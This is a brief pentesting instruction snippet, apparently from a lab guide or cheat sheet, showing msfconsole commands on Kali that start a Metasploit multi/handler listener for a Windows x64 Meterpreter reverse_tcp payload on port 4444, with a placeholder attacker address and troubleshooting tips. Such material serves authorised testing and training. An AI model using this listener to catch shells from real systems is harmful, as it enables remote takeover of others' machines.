**Run in:** Inside msfconsole on Kali. **Requires:** A payload with the same platform, transport and callback settings; the listener address is assigned to Kali and reachable from the target.

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST KALI_IP
set LPORT 4444
run
```

**Next check:** Compare staged versus stageless payload and transport settings; inspect handler messages before regenerating a payload.
